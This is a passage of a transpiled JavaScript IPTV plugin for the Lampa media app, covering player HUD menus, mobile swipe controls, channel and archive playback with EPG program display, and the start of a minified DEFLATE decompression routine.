      this.channel = channel;
      this.html = document.createElement('div');
    }
    return _createClass(HUDProgram, [{
      key: "create",
      value: function create() {
        var _this = this;
        this.listener.follow('set_program_endless', function (event) {
          _this.endless = event.endless;
          _this.html.append(event.endless.render());
        });
        this.listener.send('get_program_endless');
      }
    }, {
      key: "toggle",
      value: function toggle() {
        var _this2 = this;
        Lampa.Controller.add('player_iptv_hud_program', {
          toggle: function toggle() {
            Lampa.Controller.collectionSet(_this2.render());
            Lampa.Controller.collectionFocus(false, _this2.render());
          },
          up: function up() {
            _this2.endless.move(-1);
            Lampa.Controller.collectionSet(_this2.render());
            Lampa.Controller.collectionFocus(false, _this2.render());
          },
          down: function down() {
            _this2.endless.move(1);
            Lampa.Controller.collectionSet(_this2.render());
            Lampa.Controller.collectionFocus(false, _this2.render());
          },
          left: function left() {
            _this2.listener.send('toggle_menu');
          },
          gone: function gone() {
            var focus = _this2.html.find('.focus');
            if (focus) focus.removeClass('focus');
          },
          back: function back() {
            _this2.listener.send('close');
          }
        });
        Lampa.Controller.toggle('player_iptv_hud_program');
      }
    }, {
      key: "render",
      value: function render() {
        return this.html;
      }
    }, {
      key: "destroy",
      value: function destroy() {}
    }]);
  }();

  var HUD = /*#__PURE__*/function () {
    function HUD(channel, program) {
      _classCallCheck(this, HUD);
      this.listener = Lampa.Subscribe();
      this.menu = new HUDMenu(this.listener, channel, program);
      this.program = new HUDProgram(this.listener, channel, program);
      this.hud = Lampa.Template.js('modss_iptv_hud');
      this.hud.find('.iptv-hud__menu').append(this.menu.render());
      this.hud.find('.iptv-hud__program').append(this.program.render());
      document.body.find('.player').append(this.hud);
      this.listen();
    }
    return _createClass(HUD, [{
      key: "create",
      value: function create() {
        this.menu.create();
        this.program.create();
        this.menu.toggle();
      }
    }, {
      key: "listen",
      value: function listen() {
        var _this = this;
        this.listener.follow('toggle_menu', function () {
          _this.menu.toggle();
        });
        this.listener.follow('toggle_program', function () {
          _this.program.toggle();
        });
      }
    }, {
      key: "destroy",
      value: function destroy() {
        this.menu.destroy();
        this.program.destroy();
        this.hud.remove();
      }
    }]);
  }();

  var THRESHOLD = 50;
  function isInPlayer(el) {
    return el && closest(el, 'body > .player');
  }
  function createPlayerSwipe() {
    var wrap = null;
    var handlers = null;
    var touchId = null;
    var initX = 0;
    var initY = 0;
    var consumed = false;
    function closeHud() {
      Lampa.Controller.move('back');
    }
    function openProgramMenu() {
      var ctrl = Lampa.Controller.enabled().name;
      if (ctrl === 'player_iptv_hud_menu' || ctrl === 'player_iptv_hud_program') {
        closeHud();
        return;
      }
      if (ctrl === 'player_tv') {
        Lampa.Controller.move('left');
        Lampa.Controller.move('right');
      } else if (ctrl === 'player') {
        Lampa.Controller.move('left');
        Lampa.Controller.move('left');
        Lampa.Controller.move('right');
      }
    }
    function openSettingsMenu() {
      var ctrl = Lampa.Controller.enabled().name;
      if (ctrl === 'player_iptv_hud_menu' || ctrl === 'player_iptv_hud_program') {
        closeHud();
        setTimeout(function () {
          return Lampa.Controller.move('right');
        }, 150);
        return;
      }
      if (ctrl === 'player_tv') Lampa.Controller.move('right');else if (ctrl === 'player') {
        Lampa.Controller.move('left');
        setTimeout(function () {
          return Lampa.Controller.move('right');
        }, 100);
      }
    }
    function onStart(e) {
      if (!document.querySelector('body > .player')) return;
      if (!isInPlayer(e.target)) return;
      var t = e.touches[0];
      touchId = t.identifier;
      initX = t.clientX;
      initY = t.clientY;
      consumed = false;
    }
    function onMove(e) {
      if (consumed) return;
      var t = Array.from(e.touches).find(function (x) {
        return x.identifier === touchId;
      });
      if (!t) return;
      var dx = initX - t.clientX;
      var dy = initY - t.clientY;
      if (Math.abs(dx) < THRESHOLD && Math.abs(dy) < THRESHOLD) return;
      consumed = true;
      if (Math.abs(dx) >= Math.abs(dy)) {
        if (dx > 0) openSettingsMenu();else if (initX < window.innerWidth * 0.15) closeHud();else openProgramMenu();
      } else {
        if (dy > 0) Lampa.Controller.move('down');else Lampa.Controller.move('up');
      }
      e.preventDefault();
    }
    function onEnd(e) {
      if (!consumed && touchId != null) {
        var t = Array.from(e.changedTouches || []).find(function (x) {
          return x.identifier === touchId;
        });
        if (t && t.clientY > window.innerHeight * 0.65) Lampa.Controller.enter();
      }
      touchId = null;
      consumed = false;
    }
    return {
      init: function init() {
        if (!Lampa.Platform.screen('mobile')) return;
        var player = document.querySelector('body > .player');
        if (!player) return;
        wrap = document.createElement('div');
        wrap.className = 'iptv-modss-swipe-zone';
        wrap.style.cssText = 'position:absolute;inset:0;z-index:100001;pointer-events:none';
        wrap.setHudOpen = function () {};
        document.addEventListener('touchstart', onStart, {
          passive: true,
          capture: true
        });
        document.addEventListener('touchmove', onMove, {
          passive: false,
          capture: true
        });
        document.addEventListener('touchend', onEnd, {
          passive: true,
          capture: true
        });
        document.addEventListener('touchcancel', onEnd, {
          passive: true,
          capture: true
        });
        handlers = {
          start: onStart,
          move: onMove,
          end: onEnd
        };
        player.appendChild(wrap);
      },
      destroy: function destroy() {
        if (handlers) {
          document.removeEventListener('touchstart', handlers.start, {
            capture: true
          });
          document.removeEventListener('touchmove', handlers.move, {
            capture: true
          });
          document.removeEventListener('touchend', handlers.end, {
            capture: true
          });
          document.removeEventListener('touchcancel', handlers.end, {
            capture: true
          });
          handlers = null;
        }
        if (wrap && wrap.parentNode) wrap.remove();
        wrap = null;
      },
      get wrap() {
        return wrap;
      }
    };
  }

  var Channels = /*#__PURE__*/function () {
    function Channels(listener) {
      var _this = this;
      _classCallCheck(this, Channels);
      this.listener = listener;
      this.html = Lampa.Template.js('modss_iptv_content');
      this.inner_listener = Lampa.Subscribe();
      this.menu = new Menu(this.inner_listener);
      this.icons = new Icons(this.inner_listener);
      this.details = new Details(this.inner_listener);
      this.tiles = new Tiles(this.inner_listener);
      this.inner_listener.follow('toggle', function (name) {
        if (name === 'icons' && _this.viewMode === 'tiles') name = 'tiles';else if (name === 'tiles' && _this.viewMode === 'list') name = 'icons';
        _this[name].toggle();
        _this.active = _this[name];
      });
      this.inner_listener.follow('back', function () {
        _this.listener.send('playlist-main');
      });
      this.inner_listener.follow('play', this.playChannel.bind(this));
      this.inner_listener.follow('play-archive', this.playArchive.bind(this));
      this.active = this.menu;
      this.viewMode = Lampa.Storage.field('iptv_modss_view_mode') || 'tiles';
      this.iconsWrap = document.createElement('div');
      this.iconsWrap.addClass('iptv-content__icons-wrap');
      this.iconsWrap.append(this.icons.render());
      this.tilesWrap = document.createElement('div');
      this.tilesWrap.addClass('iptv-content__tiles-wrap');
      this.tilesWrap.append(this.tiles.render());
      this.html.find('.iptv-content__menu').append(this.menu.render());
      this.html.find('.iptv-content__channels').append(this.iconsWrap).append(this.tilesWrap);
      this.html.find('.iptv-content__details').append(this.details.render());
      this.inner_listener.follow('view-mode-change', function (mode) {
        _this.viewMode = mode;
        _this.applyViewMode();
      });
      this.applyViewMode();
    }
    return _createClass(Channels, [{
      key: "applyViewMode",
      value: function applyViewMode() {
        var isTiles = !window.iptv_mobile && this.viewMode === 'tiles';
        this.html.toggleClass('iptv-content--tiles', isTiles);
      }
    }, {
      key: "build",
      value: function build(data) {
        this.empty = false;
        this.menu.build(data);
        this.listener.send('display', this);
      }
    }, {
      key: "addToHistory",
      value: function addToHistory(channel) {
        var board = Lampa.Storage.cache('iptv_modss_play_history_main_board', 20, []);
        var find = board.find(function (a) {
          return a.url == channel.url;
        });
        if (find) Lampa.Arrays.remove(board, find);
        board.push(channel);
        Lampa.Storage.set('iptv_modss_play_history_main_board', board);
      }
    }, {
      key: "playArchive",
      value: function playArchive(data) {
        var convert = function convert(p) {
          var item = {
            title: Lampa.Utils.parseTime(p.start).time + ' - ' + Lampa.Utils.capitalizeFirstLetter(p.title)
          };
          item.url = Url.catchupUrl(data.channel.url, data.channel.catchup.type, data.channel.catchup.source);
          item.url = Url.prepareUrl(item.url, p);
          item.need_check_live_stream = true;
          return item;
        };
        Lampa.Player.runas(Lampa.Storage.field('player_iptv'));
        Lampa.Player.play(convert(data.program));
        Lampa.Player.playlist(data.playlist.map(convert));
      }
    }, {
      key: "playChannel",
      value: function playChannel(data) {
        var _this2 = this;
        var cache = {};
        cache.none = [];
        var time;
        var update;
        var start_channel = Lampa.Arrays.clone(this.icons.icons_clone[data.position]);
        start_channel.original = this.icons.icons_clone[data.position];
        data.url = Url.prepareUrl(start_channel.url);
        if (this.archive && this.archive.channel == start_channel.original) {
          data.url = Url.catchupUrl(this.archive.channel.url, this.archive.channel.catchup.type, this.archive.channel.catchup.source);
          data.url = Url.prepareUrl(data.url, this.archive.program);
        } else {
          this.addToHistory(Lampa.Arrays.clone(start_channel));
        }
        data.locked = Boolean(Locked.find(Locked.format('channel', start_channel.original)));
        data.onGetChannel = function (position) {
          var original = _this2.icons.icons_clone[position];
          var channel = Lampa.Arrays.clone(original);
          var timeshift = _this2.archive && _this2.archive.channel == original ? _this2.archive.timeshift : 0;
          channel.name = Utils.clearChannelName(channel.name);
          channel.group = Utils.clearMenuName(channel.group);
          channel.url = Url.prepareUrl(channel.url);
          channel.icons = [];
          channel.original = original;
          if (timeshift) {
            channel.shift = timeshift;
            channel.url = Url.catchupUrl(original.url, channel.catchup.type, channel.catchup.source);
            channel.url = Url.prepareUrl(channel.url, _this2.archive.program);
          }
          if (Locked.find(Locked.format('channel', original))) {
            channel.locked = true;
          }
          if (Boolean(TVFavorites.find(channel))) {
            channel.icons.push(Lampa.Template.get('modss_iptv_icon_fav', {}, true));
          }
          if (Boolean(Locked.find(Locked.format('channel', channel)))) {
            channel.icons.push(Lampa.Template.get('modss_iptv_icon_lock', {}, true));
          }
          update = false;
          if (channel.id) {
            if (!cache[channel.id]) {
              cache[channel.id] = [];
              TVApi.program({
                name: channel.name,
                channel_id: channel.id,
                tvg: channel.tvg,
                time: EPG.time(channel, timeshift)
              }).then(function (program) {
                cache[channel.id] = program;
              })["finally"](function () {
                Lampa.Player.programReady({
                  channel: channel,
                  position: EPG.position(channel, cache[channel.id], timeshift),
                  total: cache[channel.id].length
                });
              });
            } else {
              Lampa.Player.programReady({
                channel: channel,
                position: EPG.position(channel, cache[channel.id], timeshift),
                total: cache[channel.id].length
              });
            }
          } else {
            Lampa.Player.programReady({
              channel: channel,
              position: 0,
              total: 0
            });
          }
          return channel;
        };
        data.onMenu = function (channel) {
          _this2.hud = new HUD(channel);
          var pl = document.querySelector('body > .player');
          if (pl && playerSwipe && playerSwipe.wrap && playerSwipe.wrap.parentNode) pl.appendChild(playerSwipe.wrap);
          _this2.hud.listener.follow('close', function () {
            _this2.hud = _this2.hud.destroy();
            Lampa.Controller.toggle('player_tv');
          });
          _this2.hud.listener.follow('get_program_endless', function () {
            var program = cache[channel.id || 'none'];
            var endless = _this2.details.playlist(channel, program, {
              onPlay: function onPlay(param) {
                Lampa.Player.close();
                _this2.playArchive(param);
              }
            });
            _this2.hud.listener.send('set_program_endless', {
              endless: endless
            });
          });
          _this2.hud.listener.follow('action-favorite', function (orig) {
            Lampa.PlayerIPTV.redrawChannel();
            _this2.inner_listener.send('update-favorites');
            _this2.inner_listener.send('update-channel-icon', orig);
          });
          _this2.hud.listener.follow('action-locked', function (orig) {
            Lampa.PlayerIPTV.redrawChannel();
            _this2.inner_listener.send('update-channel-icon', orig);
          });
          _this2.hud.create();
        };

        //устарело, потом удалить
        data.onPlaylistProgram = function (channel) {
          var program = cache[channel.id || 'none'];
          if (!program.length) return;
          var html = document.createElement('div');
          html.style.lineHeight = '1.4';
          Lampa.Modal.open({
            title: '',
            size: 'medium',
            html: $(html)
          });
          var endless = _this2.details.playlist(channel, program, {
            onPlay: function onPlay(param) {
              Lampa.Modal.close();
              Lampa.Player.close();
              _this2.playArchive(param);
            }
          });
          html.append(endless.render());
          Lampa.Controller.add('modal', {
            invisible: true,
            toggle: function toggle() {
              Lampa.Controller.collectionSet(html);
              Lampa.Controller.collectionFocus(false, html);
            },
            up: function up() {
              endless.move(-1);
              Lampa.Controller.collectionSet(html);
              Lampa.Controller.collectionFocus(false, html);
            },
            down: function down() {
              endless.move(1);
              Lampa.Controller.collectionSet(html);
              Lampa.Controller.collectionFocus(false, html);
            },
            back: function back() {
              Lampa.Modal.close();
              Lampa.Controller.toggle('player_tv');
            }
          });
          Lampa.Controller.toggle('modal');
        };
        data.onPlay = function (channel) {
          Pilot.notebook('channel', _this2.icons.icons_clone.indexOf(channel.original));
          if (channel.original.added) {
            channel.original.view++;
            TVFavorites.update(channel.original);
          }
        };
        data.onGetProgram = function (channel, position, container) {
          update = false;
          var timeshift = channel.shift || 0;
          var program = cache[channel.id || 'none'];
          var noprog = document.createElement('div');
          noprog.addClass('player-panel-iptv-item__prog-load');
          noprog.text(Lampa.Lang.translate('iptv_noprogram'));
          container[0].empty().append(noprog);
          if (program.length) {
            var start = EPG.position(channel, program, timeshift);
            var list = program.slice(position, position + 2);
            var now = program[start];
            if (list.length) container[0].empty();
            list.forEach(function (prog) {
              var item = document.createElement('div');
              item.addClass('player-panel-iptv-item__prog-item');
              var span = document.createElement('span');
              span.html(Lampa.Utils.parseTime(prog.start).time + (now == prog ? ' - ' + Lampa.Utils.parseTime(prog.stop).time : '') + ' &nbsp; ' + Utils.clear(prog.title));
              item.append(span);
              if (now == prog) {
                item.addClass('watch');
                var timeline = document.createElement('div');
                timeline.addClass('player-panel-iptv-item__prog-timeline');
                var div = document.createElement('div');
                div.style.width = EPG.timeline(channel, prog, timeshift) + '%';
                timeline.append(div);
                update = function update() {
                  var percent = EPG.timeline(channel, prog, timeshift);
                  div.style.width = percent + '%';
                  if (percent == 100) {
                    var next = EPG.position(channel, program, timeshift);
                    if (start !== next) {
                      Lampa.Player.programReady({
                        channel: channel,
                        position: next,
                        total: cache[channel.id].length
                      });
                    }
                  }
                };
                var switchersHidden = window.innerWidth <= 480;
                var c0 = container[0];
                var itemEl = c0 && closest(c0, '.player-panel-iptv-item') || c0 && c0.parentElement && c0.parentElement.parentElement;
                if (switchersHidden && itemEl) prepend(itemEl, timeline);else item.append(timeline);
              }
              container[0].append(item);
            });
          }
        };
        var playerSwipe = null;
        var _readyHandler = function readyHandler(readyData) {
          if (readyData && readyData.onMenu) {
            playerSwipe = createPlayerSwipe();
            playerSwipe.init();
          }
          Lampa.Player.listener.remove('ready', _readyHandler);
        };
        Lampa.Player.listener.follow('ready', _readyHandler);
        Lampa.Player.iptv(data);
        time = setInterval(function () {
          if (update) update();
        }, 1000 * 10);
        var _destroy = function destroy() {
          Lampa.Player.listener.remove('destroy', _destroy);
          Lampa.Player.listener.remove('ready', _readyHandler);
          cache = null;
          update = null;
          _this2.archive = false;
          if (_this2.hud) _this2.hud = _this2.hud.destroy();
          if (playerSwipe) {
            playerSwipe.destroy();
            playerSwipe = null;
          }
          Pilot.notebook('channel', -1);
          clearInterval(time);
        };
        Lampa.Player.listener.follow('destroy', _destroy);
      }
    }, {
      key: "toggle",
      value: function toggle() {
        var _this3 = this;
        if (this.empty) {
          Lampa.Controller.add('content', {
            invisible: true,
            toggle: function toggle() {
              Lampa.Controller.clear();
            },
            left: function left() {
              Lampa.Controller.toggle('menu');
            },
            up: function up() {
              Lampa.Controller.toggle('head');
            },
            back: function back() {
              _this3.listener.send('playlist-main');
            }
          });
          Lampa.Controller.toggle('content');
        } else this.active.toggle();
      }
    }, {
      key: "render",
      value: function render() {
        return this.empty ? this.empty.render(true) : this.html;
      }
    }, {
      key: "load",
      value: function load(playlist) {
        var _this4 = this;
        this.listener.send('loading');
        TVApi.playlist(playlist).then(this.build.bind(this))["catch"](function (e) {
          var msg = '';
          var j = e === null || e === void 0 ? void 0 : e.responseJSON;
          if (typeof e == 'string') msg = e;else if (j && (j.text || j.descr || j.title || j.message || j.error)) {
            var txt = j.text || j.descr || j.title || j.message || j.error;
            var code = j.code != null ? j.code : e.status ? String(e.status) : '';
            msg = Lampa.Lang.translate('torrent_error_connect') + ': ' + txt + (code ? ' [' + code + ']' : '');
          } else if (typeof e.status !== 'undefined') msg = Lampa.Lang.translate('torrent_error_connect') + ': [' + e.status + ']' + (e.from_error ? ' [' + e.from_error + ']' : '');else if (typeof e.message !== 'undefined') msg = e.message;
          _this4.empty = new Lampa.Empty({
            descr: '<div style="width: 60%; margin:0 auto; line-height: 1.4">' + Lampa.Lang.translate('iptv_noload_playlist') + (msg ? '<br><br>' + msg : '') + '</div>'
          });
          _this4.listener.send('display', _this4);
        });
      }
    }, {
      key: "destroy",
      value: function destroy() {
        this.menu.destroy();
        this.icons.destroy();
        this.details.destroy();
        this.tiles.destroy();
        this.inner_listener.destroy();
        this.active = false;
        this.epg_cache = null;
        this.html.remove();
      }
    }]);
  }();

  function TVComponent() {
    var html = document.createElement('div');
    var listener;
    var playlist;
    var channels;
    var initialized;
    var resizeHandler;
    var playerCallbackUnsub;
    var playerOpenedInPortrait;
    window.iptv_mobile = window.innerWidth < 730;
    if (Lampa.Manifest.app_digital >= 185) {
      listener = Lampa.Subscribe();
      playlist = new Playlist(listener);
      channels = new Channels(listener);
    }
    this.create = function () {
      return this.render();
    };
    this.initialize = function () {
      var _this = this;
      this.activity.loader(true);
      if (Lampa.Manifest.app_digital >= 185) {
        listener.follow('display', function (controller) {
          _this.active = controller;
          _this.display(controller.render());
        });
        listener.follow('loading', this.loading.bind(this));
        listener.follow('channels-load', channels.load.bind(channels));
        listener.follow('playlist-main', playlist.main.bind(playlist));
        Lampa.Listener.follow('iptv_modss_play_by_name', function (e) {
          if (channels && channels.icons && channels.icons.icons_clone) {
            var idx = findIndex(channels.icons.icons_clone, function (c) {
              return (c.name || '') === (e.name || '');
            });
            if (idx >= 0) {
              Lampa.Controller.toggle('content');
              channels.playChannel({
                position: idx,
                total: channels.icons.icons_clone.length
              });
            }
          }
        });
        playlist.load();
      } else {
        var old = Lampa.Template.get('modss_iptv_list');
        old.find('.iptv-list__title').text(Lampa.Lang.translate('iptv_update_app_title'));
        old.find('.iptv-list__text').text(Lampa.Lang.translate('iptv_update_app_text'));
        $(html).append(old);
        this.activity.loader(false);
      }
      if (window.iptv_mobile) html.addClass('iptv-mobile');
    };
    this.playlist = function () {
      playlist.main();
    };
    this.loading = function () {
      this.activity.loader(true);
      this.active = false;
      this.start();
    };
    this.display = function (render) {
      html.empty().append(render);
      Lampa.Layer.update(html);
      Lampa.Layer.visible(html);
      this.activity.loader(false);
      this.start();
    };
    this.background = function () {
      Lampa.Background.immediately('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAZCAYAAABD2GxlAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAHASURBVHgBlZaLrsMgDENXxAf3/9XHFdXNZLm2YZHQymPk4CS0277v9+ffrut62nEcn/M8nzb69cxj6le1+75f/RqrZ9fatm3F9wwMR7yhawilNke4Gis/7j9srQbdaVFBnkcQ1WrfgmIIBcTrvgqqsKiTzvpOQbUnAykVW4VVqZXyyDllYFSKx9QaVrO7nGJIB63g+FAq/xhcHWBYdwCsmAtvFZUKE0MlVZWCT4idOlyhTp3K35R/6Nzlq0uBnsKWlEzgSh1VGJxv6rmpXMO7EK+XWUPnDFRWqitQFeY2UyZVryuWlI8ulLgGf19FooAUwC9gCWLcwzWPb7Wa60qdlZxjx6ooUuUqVQsK+y1VoAJyBeJAVsLJeYmg/RIXdG2kPhwYPBUQQyYF0XC8lwP3MTCrYAXB88556peCbUUZV7WccwkUQfCZC4PXdA5hKhSVhythZqjZM0J39w5m8BRadKAcrsIpNZsLIYdOqcZ9hExhZ1MH+QL+ciFzXzmYhZr/M6yUUwp2dp5U4naZDwAF5JRSefdScJZ3SkU0nl8xpaAy+7ml1EqvMXSs1HRrZ9bc3eZUSXmGa/mdyjbmqyX7A9RaYQa9IRJ0AAAAAElFTkSuQmCC');
    };
    this.start = function () {
      var _this2 = this;
      if (Lampa.Activity.active() && Lampa.Activity.active().activity !== this.activity) return;
      if (!initialized) {
        initialized = true;
        this.initialize();
      }
      this.background();
      Lampa.Controller.add('content', {
        invisible: true,
        toggle: function toggle() {
          if (_this2.active) _this2.active.toggle();else {
            Lampa.Controller.collectionSet(html);
            Lampa.Controller.collectionFocus(false, html);
          }
        },
        left: function left() {
          Lampa.Controller.toggle('menu');
        },
        up: function up() {
          Lampa.Controller.toggle('head');
        },
        back: function back() {
          Lampa.Activity.backward();
        }
      });
      Lampa.Controller.toggle('content');
      if (!resizeHandler) {
        resizeHandler = this.resize.bind(this);
        window.addEventListener('resize', resizeHandler);
        var landscape = window.innerWidth > window.innerHeight && window.innerHeight < 768;
        playerOpenedInPortrait = !landscape;
      }
      if (!playerCallbackUnsub && Lampa.Player && Lampa.Player.callback) {
        playerCallbackUnsub = Lampa.Player.callback(function () {
          var act = Lampa.Activity.active();
          if (!act || act.component !== 'iptv_modss') return;
          var landscape = window.innerWidth > window.innerHeight && window.innerHeight < 768;
          var nowPortrait = !landscape;
          if (playerOpenedInPortrait !== undefined && playerOpenedInPortrait !== nowPortrait) {
            setTimeout(function () { _this2.doResizeUpdate(true); }, 100);
          }
        });
      }
    };
    this.pause = function () {};
    this.doResizeUpdate = function (force) {
      var newMobile = window.innerWidth < 730;
      if (!force && newMobile === window.iptv_mobile) return;
      window.iptv_mobile = newMobile;
      html.toggleClass('iptv-mobile', newMobile);
      var act = Lampa.Activity.active();
      if (!act || !act.activity || !act.activity.render) return;
      if (act.activity.active) {
        act.activity.display(act.activity.active.render(true));
      } else {
        Lampa.Activity.replace();
        var target = act.activity.render(true);
        if (target) Lampa.Layer.update(target);
      }
    };
    this.resize = function () {
      if (Lampa.Player && Lampa.Player.opened && Lampa.Player.opened()) return;
      var landscape = window.innerWidth > window.innerHeight && window.innerHeight < 768;
      playerOpenedInPortrait = !landscape;
      this.doResizeUpdate();
    };
    this.stop = function () {};
    this.render = function () {
      return html;
    };
    this.destroy = function () {
      if (playerCallbackUnsub && typeof playerCallbackUnsub === 'function') playerCallbackUnsub();
      if (resizeHandler) {
        window.removeEventListener('resize', resizeHandler);
        resizeHandler = null;
      }
      if (playlist) playlist.destroy();
      if (channels) channels.destroy();
      listener.destroy();
      html.remove();
    };
  }

  var UnpackStream = function () {
    var t = {},
      n = Uint8Array,
      i = Uint16Array,
      e = Uint32Array,
      r = new n(0),
      a = new n([0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3, 3, 3, 4, 4, 4, 4, 5, 5, 5, 5, 0, 0, 0, 0]),
      s = new n([0, 0, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6, 7, 7, 8, 8, 9, 9, 10, 10, 11, 11, 12, 12, 13, 13, 0, 0]),
      o = new n([16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15]),
      h = function h(t, n) {
        for (var r = new i(31), a = 0; a < 31; ++a) r[a] = n += 1 << t[a - 1];
        for (var s = new e(r[30]), o = 1; o < 30; ++o) for (var h = r[o]; h < r[o + 1]; ++h) s[h] = h - r[o] << 5 | o;
        return [r, s];
      },
      f = h(a, 2),
      l = f[0],
      p = f[1];
    l[28] = 258, p[258] = 28;
    var v,
      u = h(s, 0)[0],
      d = new i(32768);
    for (v = 0; v < 32768; ++v) {
      var c = (43690 & v) >>> 1 | (21845 & v) << 1;
      c = (61680 & (c = (52428 & c) >>> 2 | (13107 & c) << 2)) >>> 4 | (3855 & c) << 4, d[v] = ((65280 & c) >>> 8 | (255 & c) << 8) >>> 1;
    }
    var g = function g(t, n, e) {
        for (var r = t.length, a = 0, s = new i(n); a < r; ++a) t[a] && ++s[t[a] - 1];
        var o,
          h = new i(n);
        for (a = 0; a < n; ++a) h[a] = h[a - 1] + s[a - 1] << 1;
        if (e) {
          o = new i(1 << n);
          var f = 15 - n;
          for (a = 0; a < r; ++a) if (t[a]) for (var l = a << 4 | t[a], p = n - t[a], v = h[t[a] - 1]++ << p, u = v | (1 << p) - 1; v <= u; ++v) o[d[v] >>> f] = l;
        } else for (o = new i(r), a = 0; a < r; ++a) t[a] && (o[a] = d[h[t[a] - 1]++] >>> 15 - t[a]);
        return o;
      },
      w = new n(288);
    for (v = 0; v < 144; ++v) w[v] = 8;
    for (v = 144; v < 256; ++v) w[v] = 9;
    for (v = 256; v < 280; ++v) w[v] = 7;
    for (v = 280; v < 288; ++v) w[v] = 8;
    var y = new n(32);
    for (v = 0; v < 32; ++v) y[v] = 5;
    var m = g(w, 9, 1),
      b = g(y, 5, 1),
      T = function T(t) {
        for (var n = t[0], i = 1; i < t.length; ++i) t[i] > n && (n = t[i]);
        return n;
      },
      E = function E(t, n, i) {
        var e = n / 8 | 0;
        return (t[e] | t[e + 1] << 8) >> (7 & n) & i;
      },
      k = function k(t, n) {
        var i = n / 8 | 0;
        return (t[i] | t[i + 1] << 8 | t[i + 2] << 16) >> (7 & n);
      },
      C = function C(t, r, a) {
        (null == r || r < 0) && (r = 0), (null == a || a > t.length) && (a = t.length);
        var s = new (2 === t.BYTES_PER_ELEMENT ? i : 4 === t.BYTES_PER_ELEMENT ? e : n)(a - r);
        return s.set(t.subarray(r, a)), s;
      };
    t.FlateErrorCode = {
      UnexpectedEOF: 0,
      InvalidBlockType: 1,
      InvalidLengthLiteral: 2,
      InvalidDistance: 3,
      StreamFinished: 4,
      NoStreamHandler: 5,
      InvalidHeader: 6,
      NoCallback: 7,
      InvalidUTF8: 8,
      ExtraFieldTooLong: 9,
      InvalidDate: 10,
      FilenameTooLong: 11,
      StreamFinishing: 12,
      InvalidZipData: 13,
      UnknownCompressionMethod: 14
    };
    var F = ["unexpected EOF", "invalid block type", "invalid length/literal", "invalid distance", "stream finished", "no stream handler", "invalid header", "no callback", "invalid UTF-8 data", "extra field too long", "date not in range 1980-2099", "filename too long", "stream finishing", "invalid zip data", "determined by unknown compression method"],
      S = function S(t, n, i) {
        var e = new Error(n || F[t]);
        if (e.code = t, !i) throw e;
        return e;
      },
      x = function () {
        function t(t) {
          this.s = {}, this.p = new n(0), this.ondata = t;
        }
        return t.prototype.e = function (t) {
          this.ondata || S(5), this.d && S(4);
          var i = this.p.length,
            e = new n(i + t.length);
          e.set(this.p), e.set(t, i), this.p = e;
        }, t.prototype.c = function (t) {
          this.d = this.s.i = t || !1;
          var i = this.s.b,
            e = function (t, i, e) {
              var r = t.length;
              if (!r || e && e.f && !e.l) return i || new n(0);
              var h = !i || e,
                f = !e || e.i;
              e || (e = {}), i || (i = new n(3 * r));
              var p = function p(t) {
                  var e = i.length;
                  if (t > e) {
                    var r = new n(Math.max(2 * e, t));
                    r.set(i), i = r;
                  }
                },
                v = e.f || 0,
                d = e.p || 0,
                c = e.b || 0,
                w = e.l,
                y = e.d,
                F = e.m,
                x = e.n,
                I = 8 * r;
              do {
                if (!w) {
                  v = E(t, d, 1);
                  var U = E(t, d + 1, 3);
                  if (d += 3, !U) {
                    var D = 4 + ((d + 7) / 8 | 0),
                      L = t[D - 4] | t[D - 3] << 8,
                      z = D + L;
                    if (z > r) {
                      f && S(0);
                      break;
                    }
                    h && p(c + L), i.set(t.subarray(D, z), c), e.b = c += L, e.p = d = 8 * z, e.f = v;
                    continue;
                  }
                  if (1 === U) w = m, y = b, F = 9, x = 5;else if (2 === U) {
                    var B = E(t, d, 31) + 257,
                      M = E(t, d + 10, 15) + 4,
                      N = B + E(t, d + 5, 31) + 1;
                    d += 14;
                    var _,
                      A = new n(N),
                      G = new n(19);
                    for (_ = 0; _ < M; ++_) G[o[_]] = E(t, d + 3 * _, 7);
                    d += 3 * M;
                    var H = T(G),
                      O = (1 << H) - 1,
                      P = g(G, H, 1);
                    for (_ = 0; _ < N;) {
                      var R = P[E(t, d, O)];
                      d += 15 & R;
                      var Y = R >>> 4;
                      if (Y < 16) A[_++] = Y;else {
                        var Z = 0,
                          j = 0;
                        for (16 === Y ? (j = 3 + E(t, d, 3), d += 2, Z = A[_ - 1]) : 17 === Y ? (j = 3 + E(t, d, 7), d += 3) : 18 === Y && (j = 11 + E(t, d, 127), d += 7); j--;) A[_++] = Z;
                      }
                    }
                    var q = A.subarray(0, B),
                      J = A.subarray(B);
                    F = T(q), x = T(J), w = g(q, F, 1), y = g(J, x, 1);
                  } else S(1);
                  if (d > I) {
                    f && S(0);
                    break;
                  }
                }
                h && p(c + 131072);
                for (var K = (1 << F) - 1, Q = (1 << x) - 1, V = d;; V = d) {
                  var W = w[k(t, d) & K],
                    X = W >>> 4;
                  if ((d += 15 & W) > I) {
                    f && S(0);
                    break;
                  }
                  if (W || S(2), X < 256) i[c++] = X;else {
                    if (256 === X) {
                      V = d, w = null;
                      break;
                    }
                    var $ = X - 254;
                    if (X > 264) {
                      var tt = X - 257,
                        nt = a[tt];
                      $ = E(t, d, (1 << nt) - 1) + l[tt], d += nt;
                    }
                    var it = y[k(t, d) & Q],
                      et = it >>> 4;
                    it || S(3), d += 15 & it;
                    var rt = u[et];
                    if (et > 3) {
                      var at = s[et];
                      rt += k(t, d) & (1 << at) - 1, d += at;
                    }
                    if (d > I) {
                      f && S(0);
                      break;
                    }
                    h && p(c + 131072);
                    for (var st = c + $; c < st; c += 4) i[c] = i[c - rt], i[c + 1] = i[c + 1 - rt], i[c + 2] = i[c + 2 - rt], i[c + 3] = i[c + 3 - rt];
                    c = st;
                  }
                }
                e.l = w, e.p = V, e.b = c, e.f = v, w && (v = 1, e.m = F, e.d = y, e.n = x);
              } while (!v);
              return c === i.length ? i : C(i, 0, c);
            }(this.p, this.o, this.s);
          this.ondata(C(e, i, this.s.b), this.d), this.o = C(e, this.s.b - 32768), this.s.b = this.o.length, this.p = C(this.p, this.s.p / 8 | 0), this.s.p &= 7;
        }, t.prototype.push = function (t, n) {
          this.e(t), this.c(n);
        }, t;
      }();
